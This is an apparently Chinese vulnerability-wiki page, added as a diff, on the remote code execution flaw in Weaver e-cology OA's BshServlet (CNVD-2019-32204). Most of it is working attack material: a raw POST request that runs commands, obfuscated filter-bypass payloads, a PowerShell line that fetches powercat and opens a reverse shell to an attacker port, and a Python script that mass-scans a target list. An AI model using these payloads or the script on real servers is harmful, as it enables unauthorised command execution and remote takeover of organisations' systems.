@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20BshServlet%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2019-32204/">
+    <link rel="shortcut icon" href="../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>泛微OA E-Cology BshServlet 远程代码执行漏洞 CNVD-2019-32204 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u6cdb\u5faeOA E-Cology BshServlet \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e CNVD-2019-32204", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u7f51\u7edc\u6d4b\u7ed8", url: "#_2" },
+              {title: "\u6f0f\u6d1e\u5f71\u54cd", url: "#_3" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_4" },
+              {title: "\u6f0f\u6d1ePOC", url: "#poc" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E6%B3%9B%E5%BE%AEOA%20E-Cology%20HrmCareerApplyPerView.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E6%B3%9B%E5%BE%AEOA%20E-Cology%20HrmCareerApplyPerView.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        泛微OA E-Cology HrmCareerApplyPerView.jsp SQL注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E6%B3%9B%E5%BE%AEOA%20E-Bridge%20saveYZJFile%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E6%B3%9B%E5%BE%AEOA%20E-Bridge%20saveYZJFile%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        泛微OA E-Bridge saveYZJFile 任意文件读取漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="oa-e-cology-bshservlet-cnvd-2019-32204">泛微OA E-Cology BshServlet 远程代码执行漏洞 CNVD-2019-32204<a class="headerlink" href="#oa-e-cology-bshservlet-cnvd-2019-32204" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>2019年9月17日泛微OA官方更新了一个远程代码执行漏洞补丁, 泛微e-cology OA系统的Java Beanshell接口可被未授权访问, 攻击者调用该Beanshell接口, 可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行, 漏洞等级严重.</p>
+<h2 id="_2">网络测绘<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>app=“泛微-协同办公OA”
+</code></pre></div>
+<h2 id="_3">漏洞影响<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>E-cology 7.0
+E-cology 8.0
+E-cology 8.1
+E-cology 9.0
+</code></pre></div>
+<h2 id="_4">漏洞复现<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<p>直接在网站根目录后加入组件访问路径 /weaver/bsh.servlet.BshServlet/，如下图在victim上执行了命令“whoami”</p>
+<p><img alt="image-20220209104639420" src="../images/202202091046499.png" /></p>
+<p>请求包为</p>
+<div class="highlight"><pre><span></span><code>POST<span class="w"> </span>/weaver/bsh.servlet.BshServlet<span class="w"> </span>HTTP/1.1
+Host:<span class="w"> </span>xxxxxxxx:8088
+Accept:<span class="w"> </span>*/*
+Accept-Language:<span class="w"> </span>en
+User-Agent:<span class="w"> </span>Mozilla/5.0<span class="w"> </span><span class="o">(</span>compatible<span class="p">;</span><span class="w"> </span>MSIE<span class="w"> </span><span class="m">9</span>.0<span class="p">;</span><span class="w"> </span>Windows<span class="w"> </span>NT<span class="w"> </span><span class="m">6</span>.1<span class="p">;</span><span class="w"> </span>Win64<span class="p">;</span><span class="w"> </span>x64<span class="p">;</span><span class="w"> </span>Trident/5.0<span class="o">)</span>
+Connection:<span class="w"> </span>close
+Content-Length:<span class="w"> </span><span class="m">98</span>
+Content-Type:<span class="w"> </span>application/x-www-form-urlencoded
+
+bsh.script<span class="o">=</span>ex<span class="se">\u</span>0065c<span class="o">(</span><span class="s2">&quot;cmd /c dir&quot;</span><span class="o">)</span><span class="p">;&amp;</span>bsh.servlet.captureOutErr<span class="o">=</span>true<span class="p">&amp;</span>bsh.servlet.output<span class="o">=</span>raw
+</code></pre></div>
+<p><strong>关于绕过</strong></p>
+<div class="highlight"><pre><span></span><code>eval%00<span class="o">(</span><span class="s2">&quot;ex&quot;</span>%2b<span class="s2">&quot;ec(\&quot;whoami\&quot;)&quot;</span><span class="o">)</span><span class="p">;</span>
+ex<span class="se">\u</span>0065c<span class="o">(</span><span class="s2">&quot;cmd /c dir&quot;</span><span class="o">)</span><span class="p">;</span>
+IEX<span class="o">(</span>New-Object<span class="w"> </span>System.Net.Webclient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s1">&#39;https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1&#39;</span><span class="o">)</span><span class="p">;</span>powercat<span class="w"> </span>-c<span class="w"> </span>ip<span class="w"> </span>-p<span class="w"> </span><span class="m">6666</span><span class="w"> </span>-e<span class="w"> </span>cmd
+</code></pre></div>
+<h2 id="poc">漏洞POC<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h2>
+<p><a href="https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204">https://github.com/myzing00/Vulnerability-analysis/tree/master/0917/weaver-oa/CNVD-2019-32204</a></p>
+<div class="highlight"><pre><span></span><code><span class="c1">#/usr/bin/python</span>
+<span class="c1">#coding:utf-8</span>
+<span class="c1">#Author:Ja0k</span>
+<span class="c1">#For Weaver-Ecology-OA_RCE</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">urllib3</span>
+<span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">urllib3</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span><span class="o">,</span><span class="nn">sys</span>
+
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;text/xml; charset=utf-8&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;Accept&#39;</span><span class="p">:</span> <span class="s1">&#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;Cache-Control&#39;</span><span class="p">:</span> <span class="s1">&#39;max-age=0&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;Upgrade-Insecure-Requests&#39;</span><span class="p">:</span> <span class="s1">&#39;1&#39;</span><span class="p">,</span>
+    <span class="s1">&#39;Content-Length&#39;</span><span class="p">:</span> <span class="s1">&#39;578&#39;</span>
+<span class="p">}</span>
+
+<span class="n">proxies</span><span class="o">=</span> <span class="p">{</span><span class="s1">&#39;http&#39;</span><span class="p">:</span><span class="s1">&#39;http://127.0.0.1:8080&#39;</span><span class="p">}</span>
+
+<span class="k">def</span><span class="w"> </span><span class="nf">Poc_check</span><span class="p">(</span><span class="n">target</span><span class="p">):</span>
+
+    <span class="n">Url_Payload1</span><span class="o">=</span><span class="s2">&quot;/bsh.servlet.BshServlet&quot;</span>
+    <span class="n">Url_Payload2</span><span class="o">=</span><span class="s2">&quot;/weaver/bsh.servlet.BshServlet&quot;</span>
+    <span class="n">Url_Payload3</span><span class="o">=</span><span class="s2">&quot;/weaveroa/bsh.servlet.BshServlet&quot;</span>
+    <span class="n">Url_Payload4</span><span class="o">=</span><span class="s2">&quot;/oa/bsh.servlet.BshServlet&quot;</span>
+
+    <span class="n">Data_Payload1</span><span class="o">=</span><span class="s2">&quot;&quot;&quot;bsh.script=exec(&quot;whoami&quot;);&amp;bsh.servlet.output=raw&quot;&quot;&quot;</span>
+    <span class="n">Data_Payload2</span><span class="o">=</span> <span class="s2">&quot;&quot;&quot;bsh.script=</span><span class="se">\u0065\u0078\u0065\u0063</span><span class="s2">(&quot;whoami&quot;);&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw&quot;&quot;&quot;</span>
+    <span class="n">Data_Payload3</span><span class="o">=</span> <span class="s2">&quot;&quot;&quot;bsh.script=eval%00(&quot;ex&quot;%2b&quot;ec(bsh.httpServletRequest.getParameter(</span><span class="se">\\</span><span class="s2">&quot;command</span><span class="se">\\</span><span class="s2">&quot;))&quot;);&amp;bsh.servlet.captureOutErr=true&amp;bsh.servlet.output=raw&amp;command=whoami&quot;&quot;&quot;</span>
+    <span class="k">for</span> <span class="n">Url_Payload</span> <span class="ow">in</span> <span class="p">(</span><span class="n">Url_Payload1</span><span class="p">,</span><span class="n">Url_Payload2</span><span class="p">,</span><span class="n">Url_Payload3</span><span class="p">,</span><span class="n">Url_Payload4</span><span class="p">):</span>
+        <span class="n">url</span><span class="o">=</span> <span class="n">target</span> <span class="o">+</span> <span class="n">Url_Payload</span>
+        <span class="k">for</span> <span class="n">Data_payload</span> <span class="ow">in</span> <span class="p">(</span><span class="n">Data_Payload1</span><span class="p">,</span><span class="n">Data_Payload2</span><span class="p">,</span><span class="n">Data_Payload3</span><span class="p">):</span> 
+            <span class="k">try</span><span class="p">:</span>
+                <span class="n">http_response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">Data_payload</span><span class="p">,</span><span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span><span class="n">verify</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span>
+                <span class="c1">#print http_response.status_code</span>
+                <span class="k">if</span> <span class="n">http_response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+                    <span class="k">if</span> <span class="s2">&quot;;&lt;/script&gt;&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">(</span><span class="n">http_response</span><span class="o">.</span><span class="n">content</span><span class="p">):</span>
+                        <span class="k">if</span> <span class="s2">&quot;Login.jsp&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">(</span><span class="n">http_response</span><span class="o">.</span><span class="n">content</span><span class="p">):</span>
+                            <span class="k">if</span> <span class="s2">&quot;Error&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="p">(</span><span class="n">http_response</span><span class="o">.</span><span class="n">content</span><span class="p">):</span>
+                                <span class="nb">print</span> <span class="s2">&quot;</span><span class="si">{0}</span><span class="s2"> is a E-cologyOA_RCE Vulnerability&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+                                <span class="nb">print</span> <span class="s2">&quot;Server Current Username：</span><span class="si">{0}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">http_response</span><span class="o">.</span><span class="n">content</span><span class="p">)</span>
+                <span class="k">elif</span> <span class="n">http_response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">500</span><span class="p">:</span>
+                    <span class="nb">print</span> <span class="s2">&quot;</span><span class="si">{0}</span><span class="s2">500 maybe is Weaver-EcologyOA，Please confirm by yourself &quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+                <span class="k">else</span><span class="p">:</span>
+                    <span class="k">pass</span>              
+            <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span><span class="n">Error</span><span class="p">:</span>
+                <span class="k">pass</span>    
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="n">readlines</span><span class="p">():</span>
+        <span class="n">target</span><span class="o">=</span><span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+        <span class="n">Poc_check</span><span class="p">(</span><span class="n">target</span><span class="p">)</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>#1.install python Dependencies Library 
+pip install requests
+
+#2.批量脚本 执行 
+python Weaver-Ecology-OA_RCE-exp.py 
+
+
+url.txt文件中 是url地址 需要带http协议
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E6%B3%9B%E5%BE%AEOA%20E-Cology%20HrmCareerApplyPerView.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E6%B3%9B%E5%BE%AEOA%20E-Cology%20HrmCareerApplyPerView.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        泛微OA E-Cology HrmCareerApplyPerView.jsp SQL注入漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E6%B3%9B%E5%BE%AEOA%20E-Bridge%20saveYZJFile%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E6%B3%9B%E5%BE%AEOA%20E-Bridge%20saveYZJFile%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        泛微OA E-Bridge saveYZJFile 任意文件读取漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
